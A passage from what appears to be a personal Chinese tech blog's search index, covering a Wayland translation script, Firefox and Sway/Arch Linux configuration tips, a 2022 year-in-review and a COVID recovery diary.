\u0026gt;\u0026gt;\u0026gt; d : a \u0026lt;\u0026lt; d; a = b.charAt(c) === Yb ? (a + d) \u0026amp; 4294967295 : a ^ d; } return a; } const http = require(\u0026#34;http\u0026#34;); const readline = require(\u0026#34;readline\u0026#34;); const rl = readline.createInterface({ input: process.stdin, output: process.stdout, }); rl.question(\u0026#34;\u0026#34;, function (text) { var strip_text = text.replace(/\\n/g, \u0026#34;\u0026#34;); var target_language = \u0026#34;zh-CN\u0026#34;; const options = { hostname: \u0026#34;translate.google.com\u0026#34;, path: `/translate_a/single?client=webapp\u0026amp;sl=auto\u0026amp;tl=${target_language}\u0026amp;hl=${target_language}\u0026amp;dt=at\u0026amp;dt=bd\u0026amp;dt=ex\u0026amp;dt=ld\u0026amp;dt=md\u0026amp;dt=qca\u0026amp;dt=rw\u0026amp;dt=rm\u0026amp;dt=ss\u0026amp;dt=t\u0026amp;source=bh\u0026amp;ssel=0\u0026amp;tsel=0\u0026amp;kc=1\u0026amp;tk=${TL( strip_text, )}\u0026amp;q=${encodeURIComponent(strip_text)}`, method: \u0026#34;GET\u0026#34;, headers: { responseType: \u0026#34;json\u0026#34; }, }; const req = http .request(options, (res) =\u0026gt; { let data = \u0026#34;\u0026#34;; res.on(\u0026#34;data\u0026#34;, (chunk) =\u0026gt; { data += chunk; }); // Ending the response res.on(\u0026#34;end\u0026#34;, () =\u0026gt; { var result = JSON.parse(data); var content_list = result[0]; var final = \u0026#34;\u0026#34;; // console.log(content_list) for (let index = 0; index \u0026lt; content_list.length; index++) { if (content_list[index][0] !== null) { final += content_list[index][0]; } else { break; } } console.log(final); }); }) .on(\u0026#34;error\u0026#34;, (err) =\u0026gt; { console.log(\u0026#34;Error: \u0026#34;, err); }) .end(); }); ","permalink":"https://ch3n9w.github.io/posts/tech-translation-under-wayland/","summary":"\u003cp\u003e对于我这种英语不好的人来说, 翻译是离不开的工具, 但是众所周知, Linux的日用软件生态相比较windows和macos来说相差甚远, 别说目前正处于发展阶段的wayland, 就连成熟透了的x11下也没有拿得出手的翻译软件. 作为一个英语不好的Linux爱好者, 缺少翻译软件必定会对日常的使用造成一定的影响, 于是开始思考怎么样解决这个问题.\u003c/p\u003e\n\u003cp\u003e我的第一个思路, 也就是见到最多的划词翻译软件的样子, 选中文本之后, 在被选中的文本周围的某块区域中绘制一个窗口, 在其中展示翻译结果. 但是问题来了, 要如何绘制这样的窗口呢? 在wayland中, 窗口的位置交给了compositor进行管理, 这种能够自己决定显示位置的能力, 据我所知, 在wayland下仅有fcitx5做到了, 于是我翻阅了一下它的源代码, 并没有看懂, 但是应该没有借助于Qt和GTK来绘制, 而是使用wayland-client. 对我这样一个连Qt GTK开发经历都没有的人来说, 理解wayland编程开发中的那些概念实在有些困难. 于是紧接着又有一个问题出现了:\u003c/p\u003e\n\u003cp\u003e能否绕开wayland?\u003c/p\u003e\n\u003cp\u003e就我思考这个问题的时候, linux QQ给我发了一个系统通知, 我的电脑上的系统通知服务原先只是为了让linux qq不崩溃才安装的, 然而这个时候, 它给了我一个新的解决方案: 使用系统通知来呈现翻译结果. 于是搜了一下如何发送系统通知, 发现竟然意外的简单.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enotify-send \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;title\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;content\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e那么接下来的问题: 如何获取选中文本的内容? 这个问题, 我原本计划通过阅读\u003ccode\u003ewl-clipboard\u003c/code\u003e来学习的, 但是我想先尽快用上翻译, 把优化放到以后再说, 于是决定直接使用\u003ccode\u003ewl-clipboard\u003c/code\u003e来获取选中文本内容, 那么至此思路理清, 大致如下:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e使用剪切板获取到选中文本的内容, 可以使用\u003ccode\u003ewl-paste -p\u003c/code\u003e来获取\u003c/li\u003e\n\u003cli\u003e获取文本之后, 将换行符替换成空格 (这块可以有更好的处理方法, 简单起见就全换掉了), 使用\u003ccode\u003esed\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e文本处理完毕后, 将文本输入进\u003ccode\u003etranslate.js\u003c/code\u003e中进行翻译, (这块可以使用别的现成工具)\u003c/li\u003e\n\u003cli\u003e翻译结果出来之后, 将结果以系统通知的形式呈现出来, 当然, 系统通知必须要有, 可以是\u003ccode\u003edunst\u003c/code\u003e, \u003ccode\u003emako\u003c/code\u003e, \u003ccode\u003eswaync\u003c/code\u003e, 以及kde或者gnome的桌面消息通知都可以. 发送翻译结果使用命令\u003ccode\u003enotify-send \u0026quot;标题\u0026quot; \u0026quot;翻译内容\u0026quot;\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e以我的划词翻译为案例,  我在\u003ccode\u003e~/.config/sway/config\u003c/code\u003e中加入了这么一行作为划词翻译触发按键\u003c/p\u003e","title":"wayland下的划词翻译解决方案"},{"content":"不管火狐的市场份额多么拉胯, 对于Linux wayland用户来说, 目前体验最好的浏览器依旧是Firefox. 本篇记录我的FIrefox配置, 包括浏览器设置和插件设置.\n外观 titlebar 为了让标题栏中的内容可以更加紧凑, 一个好办法是进入about:config, 设置browser.compactmode.show为true, 然后进入custom toolbar, 设置Density为Compact\n对于wm用户, 一个推荐的设置是勾选上上图中的Title Bar选项, 为什么要这么设置呢, 因为这样子做, 那些按钮(最大最小化, 关闭窗口)就会出现到title bar中, 然后title bar会被wm吃掉, 这样就可以给火狐的标题栏留出更多的空间\nps: 我用的主题名字叫做tokyonight\nFirefox-UI-Fix 使用Firefox-UI-Fix来个性化Firefox的界面\nAddon Vimium 该插件将vim的操作方式带入到浏览器中, 能够让用户更少依赖鼠标.\n默认情况下, firefox出于安全考虑会在一些页面中禁用Addon, 为了让该插件能够在更多的页面上使用, 需要在about:config中进行以下设置\nextensions.webextensions.restrictedDomains清空掉 privacy.resistFingerprinting.block_mozAddonManager设置为true,来让插件在所有页面上都可以使用 以下是我的Vimium键位设置.\n# Insert your preferred key mappings here. unmapAll map H previousTab map J previousTab map L nextTab map K nextTab map \u0026lt;c-j\u0026gt; scrollPageDown map \u0026lt;c-k\u0026gt; scrollPageUp map \u0026lt;c-o\u0026gt; goBack map \u0026lt;c-i\u0026gt; goForward map o Vomnibar.activateInNewTab map b Vomnibar.activateBookmarksInNewTab map t Vomnibar.activateTabSelection map M LinkHints.activateModeToOpenInNewTab map m LinkHints.activateModeToOpenInNewForegroundTab map gi focusInput map gg scrollToTop map G scrollToBottom map j scrollDown map k scrollUp map h scrollLeft map l scrollRight map x removeTab map X restoreTab map ? showHelp map yy copyCurrentUrl map p openCopiedUrlInNewTab Tip: 如果在某次更新之后发现插件不可用了, 那么可以考虑临时切换到另一个类似的插件 Vimium C , 把相同的键位复制进去就行啦.\n然后, 虽然我不经常用, 但是vomnibar是个好东西, 按一个键即可呼出, 在其中搜索tab, 书签, 历史记录, 以及调用搜索引擎,可惜默认主题有点丑, 可以去github上找一些主题, 我个人用的是 https://github.com/catppuccin/vimium\nTampermonkey 常用的脚本不多, 有 https://github.com/the1812/Bilibili-Evolved 和https://github.com/wandou-cc/blog-ui\nChecker Plus for Gmail 进入Option, 添加账号并且设置为stay signed in, 就可以方便管理多个gmail邮箱了.\n其他 Zotero Connector : 搜集文献的时候用的 Cookie-Editor : 编辑Cookie Dark Reader : 全部页面化为暗色模式 Google Scholar Button : 谷歌学术查询, 可以方便查文献 Octotree : 在github仓库网页上列出文件树, 方便临时查阅代码 TWP : 谷歌翻译插件 uBlock Origin : 因为效果太好被chrome下架了一阵子的广告拦截插件 Adblocker for youtube: 跳过youtube的广告 视频硬件解码 参考Archwiki\ngfx.webrender.all = true gfx.webrender.enabled = true media.ffmpeg.vaapi.enabled = true media.ffvpx.enabled = false media.navigator.mediadatadecoder_vpx_enabled = true media.rdd-vpx.enabled = false 由于vainfo显示我的显卡不支持av1解码,所以禁用av1比较好\nmedia.av1.enabled = false 至于vdpau, 由于只有nvidia才可以用, 我没有n卡, 所以不需要安装.\n最后可以使用nvtop来查看视频硬解是否正常工作, 如果出现DEC字样说明正常.\n最后 我并不是一个Mozilla吹, 恰恰相反, 我对这个把大把金钱花在政治活动和给管理层发工资的组织颇有微词, 如果你有兴趣, 可以看看相关的调查报告.\n只是相比之下, 利用自己的市场占有率强行推Manifest v3 和 Web Environment Integrity API 的 google很明显希望对浏览器插件进行最大程度的限制, 尤其是影响到他们赚钱的广告拦截器. 这样的行为很明显与互联网的自由开放精神相互违背, 但是很遗憾, 抛弃chrome选择其他chromium-based浏览器并不能解决问题, 用户依旧受制于chromium的代码库, 而后者作为这些浏览器的基础代码, 只要谷歌对其进行修改, 那么其他浏览器迟早都要跟进. 即便是Firefox也使用了Manifest V3, 但是他依旧保留了Manifest V2, 算是一点小小的反抗吧.\n","permalink":"https://ch3n9w.github.io/posts/tech-arm-firefox/","summary":"\u003cp\u003e不管火狐的市场份额多么拉胯, 对于Linux wayland用户来说, 目前体验最好的浏览器依旧是Firefox. 本篇记录我的FIrefox配置, 包括浏览器设置和插件设置.\u003c/p\u003e\n\u003ch2 id=\"外观\"\u003e外观\u003c/h2\u003e\n\u003ch3 id=\"titlebar\"\u003etitlebar\u003c/h3\u003e\n\u003cp\u003e为了让标题栏中的内容可以更加紧凑, 一个好办法是进入\u003ccode\u003eabout:config\u003c/code\u003e, 设置\u003ccode\u003ebrowser.compactmode.show\u003c/code\u003e为true, 然后进入custom toolbar, 设置\u003ccode\u003eDensity\u003c/code\u003e为\u003ccode\u003eCompact\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20230109231814714.png\" alt=\"image-20230109231814714\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e对于wm用户, 一个推荐的设置是勾选上上图中的\u003ccode\u003eTitle Bar\u003c/code\u003e选项, 为什么要这么设置呢, 因为这样子做, 那些按钮(最大最小化, 关闭窗口)就会出现到title bar中, 然后title bar会被wm吃掉, 这样就可以给火狐的标题栏留出更多的空间\u003c/p\u003e\n\u003cp\u003eps: 我用的主题名字叫做tokyonight\u003c/p\u003e\n\u003ch3 id=\"firefox-ui-fix\"\u003eFirefox-UI-Fix\u003c/h3\u003e\n\u003cp\u003e使用\u003ca href=\"https://github.com/black7375/Firefox-UI-Fix\"\u003eFirefox-UI-Fix\u003c/a\u003e来个性化Firefox的界面\u003c/p\u003e\n\u003ch2 id=\"addon\"\u003eAddon\u003c/h2\u003e\n\u003ch3 id=\"vimium\"\u003eVimium\u003c/h3\u003e\n\u003cp\u003e该插件将vim的操作方式带入到浏览器中, 能够让用户更少依赖鼠标.\u003c/p\u003e\n\u003cp\u003e默认情况下, firefox出于安全考虑会在一些页面中禁用Addon, 为了让该插件能够在更多的页面上使用, 需要在\u003ccode\u003eabout:config\u003c/code\u003e中进行以下设置\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003eextensions.webextensions.restrictedDomains\u003c/code\u003e清空掉\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eprivacy.resistFingerprinting.block_mozAddonManager\u003c/code\u003e设置为true,来让插件在所有页面上都可以使用\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e以下是我的Vimium键位设置.\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# Insert your preferred key mappings here.\nunmapAll\nmap H previousTab\nmap J previousTab\nmap L nextTab\nmap K nextTab\nmap \u0026lt;c-j\u0026gt; scrollPageDown\nmap \u0026lt;c-k\u0026gt; scrollPageUp\nmap \u0026lt;c-o\u0026gt; goBack\nmap \u0026lt;c-i\u0026gt; goForward\nmap o Vomnibar.activateInNewTab\nmap b Vomnibar.activateBookmarksInNewTab\nmap t Vomnibar.activateTabSelection\nmap M LinkHints.activateModeToOpenInNewTab\nmap m LinkHints.activateModeToOpenInNewForegroundTab\nmap gi focusInput\nmap gg scrollToTop\nmap G scrollToBottom\nmap j scrollDown\nmap k scrollUp\nmap h scrollLeft\nmap l scrollRight\nmap x removeTab\nmap X restoreTab\nmap ? showHelp\nmap yy copyCurrentUrl\nmap p openCopiedUrlInNewTab\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eTip: 如果在某次更新之后发现插件不可用了, 那么可以考虑临时切换到另一个类似的插件 Vimium C , 把相同的键位复制进去就行啦.\u003c/p\u003e","title":"武装火狐"},{"content":" 2022年是一个记得被纪念的年份, 不是因为它有多好, 而是因为它有多现实\n于我个人而言, 2022年并不是一个好年份, 想必读者也是这么认为的, 但是要说具体哪里不好, 可能又说不上来, 或者是那些震动三观的记忆随着国家对舆论的引导而变得模糊, 毕竟这是政府惯用的手段. 只是总有人不甘心于此, 不甘心于铺天盖地的好好好和赢赢赢,不甘心于1984般的舆论洗脑,于是我们能看到昙花一现的网易新闻2022年度盘点,能在一个个转发的微信消息中窥见残忍的现实. 这样的一年是富有意义的, 它让太多的人变得清醒, 只是终究还是担心, 这样的清醒在被肆意玩弄的舆论下还能留存多久, 毕竟人是健忘的, 个体如此, 社会亦然, 而反抗之道, 在乎文字与记录.\n于是我坚持记录日记, 并且把每个月的日记中比较有价值的片段单独摘录到新的文件中以方便回顾, 就这样一点一滴记录了整整一年的时间, 这也是我第一次如此稳定地一直使用同一款笔记软件. 多亏这看似微不足道的习惯, 让我能够在短短几分钟时间里回顾今年值得记录的几个转变.\n彻底放弃CTF和网络安全 这是一个很重要的决定, 因为在相当长的一段时间里, 自己给自己贴的标签依旧是所谓的黑客, 各种的竞赛和外快也给自己带来了一点收入和乐趣, 然而在这个领域呆得越久, 我越觉得自己不是这块料, 期间也有过几次挣扎, 然而终究还是深入不下去. 这或许和该领域所强调的反向思维有关, 又或许只是我单纯不够努力, 然而时至今日, 看着当初一同学习的小伙伴如今成为了业内的大牛, 太多的失望积累起来, 让我最终下定决心离开, 毕竟哪怕抛开个人感情不谈, 博士毕业也需要我把更多的注意力放在论文上.\n不再相信权威 在此之前, 我对于官媒尽管保持忽视的态度, 但是对于其中的信息真实性并没有怀疑. 但是在经历过2022年的疫情后, 在看到经历人祸的人民被政府掐着脖子说好好好之后, 一切的信任都被推翻, 如今的自己在听到官媒发布的消息时, 只会麻木的默默捂住耳朵.\n放一放技术, 多关心关心身边人和身体健康 过去的自己在那些所谓的新颖技术上花费了太多心思, 没有照顾好自己, 也没有关心到他人. 然而人才是本, 计算机不是, 不能因为折腾而牺牲自己的人际关系, 更不能牺牲自己的身体健康.\n看清现实 过去的时光总是如此的美好, 尤其是和当下的焦虑和迷茫相比更是如此. 这两年所看到的事物, 所听到的见闻, 无不在告诉自己: 这个世界一团糟, 普通人如果不把自己的双手弄脏就只能成为被剥削的对象; 开源社区的技术都是在为权力和资本服务; 疫情防控让多地政府暴露出其丑恶的真实嘴脸; 经济下行的同时资本家更加不顾普通人死活肆无忌惮的敛财; 房地产市场萧条下开发商和普通消费者的众生相, 就连研究生的导师招学生也不是为了传道授业而是为了拉人干活, 利益交换. 我变得越来越麻木, 原来所谓成长, 就是生活中那些纯粹的东西一个一个砸碎, 只留下一地鸡毛的过程啊.\n但是,经历这些之后, 才会更加深刻意识到过去的美好时光正是在这些世俗众生的支撑下所营造出的为年轻人的假象, 真正的世界, 本就如此. 除了拔剑, 别无选择.\n希望2023年, 自己可以变得更好.\n","permalink":"https://ch3n9w.github.io/posts/gossip-2022-summary/","summary":"\u003cblockquote\u003e\n\u003cp\u003e2022年是一个记得被纪念的年份, 不是因为它有多好, 而是因为它有多现实\u003c/p\u003e\n\u003c/blockquote\u003e","title":"2022年度总结"},{"content":" 生命本就如此脆弱\n12.16 宿舍楼里的人很多已经阳了, 斜对门的宿舍也阳了. 学校赶人且机票价格低,于是选在了16号出发.\n16号当天来到机场的时候完全没有检查健康宝的步骤, 甚至没有量体温的步骤, 一瞬间的感觉是很不习惯, 然后就是觉得危险. 但是早餐不能不吃, 于是在登机口吃了kfc, 这是可能感染的第一个点.\n坐飞机, 下飞机, 上大巴, 然后到车站. 这期间能被感染的点太多了, 人口聚集太密集了.\n回到家后, 凌晨一点不到感觉身体着凉,喉咙隐隐有点不舒服.\n12.17 喉咙发炎,没量体温,仍存有侥幸心理.\n12.18 喉咙发炎+头晕,体温正常,家里人因此觉得只是感冒,我说可能是新冠,但是你们肯定防不住了.\n12.19 喉咙发炎加重为刀片嗓, 头不晕了,体温正常.\n12.20 刀片嗓,背部肌肉有些酸痛无力,开始咳嗽鼻塞流鼻涕.体温正常.\npdd上的药都要下个月才能送出来, 家里的药也很有限.\n晚上妈妈发烧了, 用抗原试纸一测很快就出来了两道杠, 估计是被我传染的, 我后悔这个时候回来, 哪怕出去旅游一圈养出抗体再回来也好.\n12.21 继续刀片嗓子，流鼻涕咳嗽鼻塞，肌肉不疼了，体温正常。老妈烧退了，但是有些头晕\n12.22 嗓子差不多好了，流鼻涕鼻塞，不咳嗽了。老爸开始出现症状，全身肌肉疼痛，但是没有发烧。\n12.23 症状基本消失. 家里人症状都有明显好转\n12.24 完全好转, 前前后后经历了八天.\n","permalink":"https://ch3n9w.github.io/posts/gossip-yang-diary-md/","summary":"\u003cblockquote\u003e\n\u003cp\u003e生命本就如此脆弱\u003c/p\u003e\n\u003c/blockquote\u003e","title":"小阳人日记"},{"content":"不知不觉使用sway已经整整一年了，于是来谈一谈自己这一年的使用感受，顺便回顾了一下过去。\n起因 2019年，在一次编程作业的时候，同专业的另一个老哥向我展示了vim的代码h补全，我立刻被这种简陋但是扩展性极强的代码编辑器吸引了，于是当时还是个刚转入计算机专业的小白就开始哼哧哼哧地学习vim的配置和插件的安装。当然，这些都发生在我的Kali Linux虚拟机中。\n那个时候我正接触CTF，很多时候都要开着虚拟机，于是有一天动起了把电脑系统直接装成linux的想法。因为自己的第一台笔记本是暗夜精灵2，游戏本装Linux，第一个要考虑的就是兼容性和稳定性，在权衡各个发行版的优势和流行程度后，我选择了ubuntu18.04。笔记本重装完毕后除了风扇转个不停竟然一切运行正常，这让我实在有些惊喜，而风扇问题是英伟达独显导致的，在ubuntu上，只需要一条sudo ubuntu-drivers autoinstall就完美解决了。当时的自己很开心，仿佛打开了一道新世界的大门。\n后来，我去吉林参加了第一次线下赛，ubuntu没有掉链子，帮我拿了一个一血，我很满意。直到一次上课，手贱执行了apt upgrade，升级完电脑竟然无法开机了，一整个无语，而当时临近期末，我已经没有时间再去折腾系统了，于是紧急安装了windows应付期末复习，顺便下单了一台对Linux更加友好的笔记本Thinkpad T480。\n期末考试结束后，我听说了Arch Linux 的大名，但是出于畏难情绪，我选择将ubuntu18.04安装在我的thinkpad t480上，然后去参加xman的夏令营。在夏令营期间，我的电脑在连接wifi一段时间后就再也连接不上了，第一次我选择了重装，但是第二次还是同样的问题，我只好绝望地回到windows10，事后分析的时候，我觉得应该是驱动的问题，thinkpad t480是2018年下半年发布的，ubuntu18.04的驱动可能确实没覆盖到它的网卡。\n之后的好几个月里，我都乖乖用着windows10和WSL2，实习的时候全程在虚拟机里面写代码。等到实习结束、保研也结束的时候，我又开始了新一轮的折腾。\n2020年下半年，我将自己的主力电脑全面迁移到了Manjaro Linux下，那个时候qv2ray还很活跃，我的科学上网也很依赖它，但是有好几次在更新的时候发生了Manjaro特有的问题：软件的版本更新上来了，但是软件的依赖没有更新上来，这种问题也影响了trilium等软件，虽然不能怪manjaro，但是我还是愤而转向了Arch Linux，一直到今天我也还在用。\n转到Arch Linux之后，我基本上不再改变自己的发行版了，只是会在图形界面折腾一些。2020年-2021年上半年我使用的都是KDE，好看是真好看，但是Bug也是真的致命，这其中我亲身经历过的至少三次重复出现在不同电脑（thinkpad T480出现过，thinkbook 14p 出现过）的bug就是盒盖睡眠失败，我不知道是谁引起的，是plasma还是conky还是别的什么组件，我不知道，我在日志里也查不到。别看这个问题好像没什么，但是作为一个笔记本用户，盒盖后放进包里是一个非常自然的行为，回到宿舍没有第一时间拿出电脑而是休息一会也是很正常的行为，但是休息完后发现自己的电脑在包里变成了一个铁板烧就不是一个正常的现象了。嘴硬的人当然会说thinkpad不是有指示灯吗？你看指示灯判断是否睡眠成功不就行了？且不说我后来的电脑thinkbook 14p是没有指示灯的，单就系统质量而言，一个系统每次使用的时候都需要用户小心翼翼盯着指示灯看，是否已经说明了这是一个糟糕的系统了？为什么换成thinkbook？就是因为这个bug把我的thinkpad的主板烧坏了！我曾以为这是thinkpad独有的问题，可是当thinkbook也发生同样问题的时候我对KDE彻底失望了，是的，这是一个很漂亮的桌面环境，定制性强又有很多特效，可是这一切都建立在一些不稳定的bug上的时候，这些特效会更多扮演起bug的导火索角色。\n经历过KDE的bug后，我对复杂的桌面环境产生了恐惧，他们就像是一枚不定时炸弹。在这个前提背景下，我接触并开始使用SwayWM，一直到今天，我也还在使用，而那个致命Bug，已经离我远去。\n体验 得益于Arch Linux庞大的用户群，Arch 的软件包生态在一众发行版中可以说是称王称霸了，我举一个例子，你能想象在Linux的软件仓库中会出现deepin-wine魔改后的腾讯系软件吗？\n每次看到其他发行版用户手动下载deb然后安装的时候，我都会产生一种他们是不是在用windows的错觉，并不是看不起别的发行版，只是各有分工和侧重点，比如Arch的定位是桌面端用户，而很多别的发行版的定位是服务器，我不会用别的发行版当作我的桌面系统，就像我不会把Arch装在服务器上一样。用统一的包管理器管理软件包肯定是有好处的，能够大大减轻用户的心智负担。\n至于网络上提到的Arch Linux不稳定、容易滚挂的问题，不好意思，我用了两年Arch了，每天都执行yay -Syyu，从来没有出现滚挂的问题，相反，我目前所遇到的半数Linux相关问题，都是因为系统软件或者依赖库过于老旧而导致的，更新后就可以解决。Linux不是Windows，如果你不想要更新，那么有两种选择，第一种，锁定自己的软件版本，然后在每次安装新软件的时候单独解决依赖问题；第二种，回去用windows。\n说完了Arch Linux，再来说说Sway，这是一个简单的wayland窗口管理器，为什么用wayland，因为我不希望自己的图形界面建立在一个老旧而难以维护的基础设施之上，那给我的感觉就好像我在使用另一个plasma。诚然，wayland还有很长的一段路要走，很多桌面软件都不得不借助xwayland才能在其上运行，经过实际使用，除了在4k屏幕上xwayland有问题之外，其他情况下还是可以完美工作的。当然，部分软件是有问题的，比如腾讯会议的桌面共享功能，但是也已经有了曲线救国的办法，所以现在wayland的生态已经比之前要好一些了，当我看到linux qq内测群里有人提出wayland下的问题以及要求兼容wayland的时候，我就相信未来还会更好。\nSway是一个窗口管理器，开发者做的事情是在wayland下复刻一个i3wm出来。窗口管理器的好处是我现在更多依赖键盘而不是鼠标了，可以减少对视觉聚焦于鼠标这种行为的依赖，转而更多依赖自己的触觉，另外，更少的特效和更简洁的设计不仅让我的系统大大增强了稳定性（据一位用KDE的同学说，直到今天，用KDE只要一周不关机就必定会崩溃），还让我自己更加专注于手头的工作（平铺式窗口管理器的统一好处）。不好的地方当然也有不少，比如初次接触的时候要花很多时间去配置和适应，比如每次修改操作键位的时候都需要一定时间去重新适应，比如fcitx5在某些软件下面无法工作或者是有缺陷（这不是fcitx5的锅），比如它让我认识到自己是一个很笨蛋的人，使用了一年了，让我时不时就发现自己的操作习惯可以有优化空间，比如：\n在按win+数字键的时候，用大拇指去按是很扭曲的姿势，**一个更加自然的姿势是用左手的掌心左下（手背视角）的部分去压win键，然后用手指去按数字键。**如果要按ctrl+win，就用同样的部位压住两个键，这个难度会大一些，大概确实还可以优化的。 调整窗口大小的时候，进入resize模式然后用键盘去按是很低效的行为，相反，这种时候依赖鼠标不是什么坏事，通过把鼠标悬停在窗口上然后按住右键进行拖拽就可以实现快速的窗口大小调整。 scratchpad中更适合使用tab模式。 有的时候在两个workspace之间切换会很频繁，这个时候更适合用workspace back_and_forth而不是一直执着于用数字键去切换，或者使用鼠标的滚轮来切换，这也是一个不错的主意。 除此之外还有一个小的优点，在sway下可以给不同键盘换上不同的布局，这点对我而言是刚需，但是在xorg下面，这种操作往往只能将同一个布局应用于所有的键盘，一旦布局出现了问题导致键盘不可用，那么所有的键盘都会变得不可用。\n最后，我和大部分的geek用户不一样，我比较笨，只是一个普通用户，我做不到也不想去和他们一样视鼠标如洪水猛兽，相反，sway下我还是会频繁使用鼠标，对我来说用鼠标去交互两个窗口的位置依旧是比用键盘更加高效的操作。所以我想说的是，追求属于自己的实用性，你可以去参考别人的建议，但是最终还是要找到属于你自己的习惯。 对于我个人来说， 我也完全不排除在plasma的bug修复后回到plasma的可能性，毕竟老牌桌面。\n列出我使用的软件：\n桌面环境 SwayWM（窗口管理） waybar（信息展示栏） 终端 alacritty 浏览器 firefox-developer-edition （主力） chrome 输入法 fcitx5 代码编辑 Neovim（主力） Vscode（副手） Jetbrains 做笔记 Neovim-qt zotero 文件浏览器 ranger dolphin 看论文 zotero okular 游戏 steam（泰拉瑞亚、黑暗之魂……） waydroid（明日方舟） HMCL（minecraft） 工具替代 exa 替代 ls zoxide 替代 cd scp 替代 cp Trouble Shooting 关机的时候出现 a stoping job is running for xxx hangout 修改/etc/systemd/system.conf\nDefaultTimeoutStopSec=5s JAVA程序在wayland下无法启动 添加环境变量\n_JAVA_AWT_WM_NONREPARENTING=1 AVD 在wayland下无法启动 用下面的语句启动android-studio再去启动avd\nQT_QPA_PLATFORM=xcb _JAVA_AWT_WM_NONREPARENTING=1 android-studio wayland下玩游戏 添加环境变量\nSDL_VIDEODRIVER=x11 waybar 在sway启动后很久才出现 sway配置中添加\nexec hash dbus-update-activation-environment 2\u0026gt;/dev/null \u0026amp;\u0026amp; \\ dbus-update-activation-environment --systemd DISPLAY WAYLAND_DISPLAY SWAYSOCK sway 顶部栏出现中文后高度变化 在sway配置文件中添加以下设置来统一使用一个高高的字符的高度.\nfor_window [title=\u0026#34;.*\u0026#34;] title_format ゜%title゜ wayland下的腾讯会议 首先新建虚拟摄像头\nsudo modprobe v4l2loopback devices=1 video_nr=10 card_label=\u0026#39;OBS Cam\u0026#39; exclusive_caps=1 sudo modprobe snd-aloop index=10 id=\u0026#39;OBS Mic\u0026#39; pacmd \u0026#39;update-source-proplist alsa_input.platform-snd_aloop.0.analog-stereo device.description=\u0026#34;OBS Mic\u0026#34;\u0026#39; 然后打开obs，点击要共享的屏幕，点击start virtual camera。这个时候再进入腾讯会议，选择视频（不是屏幕共享），然后把视频的输入源切换到这个虚拟摄像头就可以达到屏幕共享的效果了。\nGTK问题 不要在环境变量中设置GDK_BACKEND=wayland, GTK程序会自动优先选择wayland,如果不行会自动切换到xwayland\nerror: GPGME error: No data sudo rm -f /var/lib/pacman/sync/* sudo pacman -Sc ","permalink":"https://ch3n9w.github.io/posts/tech-arch-sway/","summary":"\u003cp\u003e不知不觉使用sway已经整整一年了，于是来谈一谈自己这一年的使用感受，顺便回顾了一下过去。\u003c/p\u003e\n\u003ch2 id=\"起因\"\u003e起因\u003c/h2\u003e\n\u003cp\u003e2019年，在一次编程作业的时候，同专业的另一个老哥向我展示了vim的代码h补全，我立刻被这种简陋但是扩展性极强的代码编辑器吸引了，于是当时还是个刚转入计算机专业的小白就开始哼哧哼哧地学习vim的配置和插件的安装。当然，这些都发生在我的Kali Linux虚拟机中。\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20221217104938577.png\" alt=\"image-20221217104938577\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e那个时候我正接触CTF，很多时候都要开着虚拟机，于是有一天动起了把电脑系统直接装成linux的想法。因为自己的第一台笔记本是暗夜精灵2，游戏本装Linux，第一个要考虑的就是兼容性和稳定性，在权衡各个发行版的优势和流行程度后，我选择了ubuntu18.04。笔记本重装完毕后除了风扇转个不停竟然一切运行正常，这让我实在有些惊喜，而风扇问题是英伟达独显导致的，在ubuntu上，只需要一条\u003ccode\u003esudo ubuntu-drivers autoinstall\u003c/code\u003e就完美解决了。当时的自己很开心，仿佛打开了一道新世界的大门。\u003c/p\u003e\n\u003cp\u003e后来，我去吉林参加了第一次线下赛，ubuntu没有掉链子，帮我拿了一个一血，我很满意。直到一次上课，手贱执行了\u003ccode\u003eapt upgrade\u003c/code\u003e，升级完电脑竟然无法开机了，一整个无语，而当时临近期末，我已经没有时间再去折腾系统了，于是紧急安装了windows应付期末复习，顺便下单了一台对Linux更加友好的笔记本Thinkpad T480。\u003c/p\u003e\n\u003cp\u003e期末考试结束后，我听说了Arch Linux 的大名，但是出于畏难情绪，我选择将ubuntu18.04安装在我的thinkpad t480上，然后去参加xman的夏令营。在夏令营期间，我的电脑在连接wifi一段时间后就再也连接不上了，第一次我选择了重装，但是第二次还是同样的问题，我只好绝望地回到windows10，事后分析的时候，我觉得应该是驱动的问题，thinkpad t480是2018年下半年发布的，ubuntu18.04的驱动可能确实没覆盖到它的网卡。\u003c/p\u003e\n\u003cp\u003e之后的好几个月里，我都乖乖用着windows10和WSL2，实习的时候全程在虚拟机里面写代码。等到实习结束、保研也结束的时候，我又开始了新一轮的折腾。\u003c/p\u003e\n\u003cp\u003e2020年下半年，我将自己的主力电脑全面迁移到了Manjaro Linux下，那个时候qv2ray还很活跃，我的科学上网也很依赖它，但是有好几次在更新的时候发生了Manjaro特有的问题：软件的版本更新上来了，但是软件的依赖没有更新上来，这种问题也影响了trilium等软件，虽然不能怪manjaro，但是我还是愤而转向了Arch Linux，一直到今天我也还在用。\u003c/p\u003e\n\u003cp\u003e转到Arch 